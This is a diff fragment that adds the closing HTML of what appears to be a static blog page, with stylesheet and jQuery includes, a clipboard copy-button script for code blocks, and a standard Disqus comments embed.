+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'quincyblog-top';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
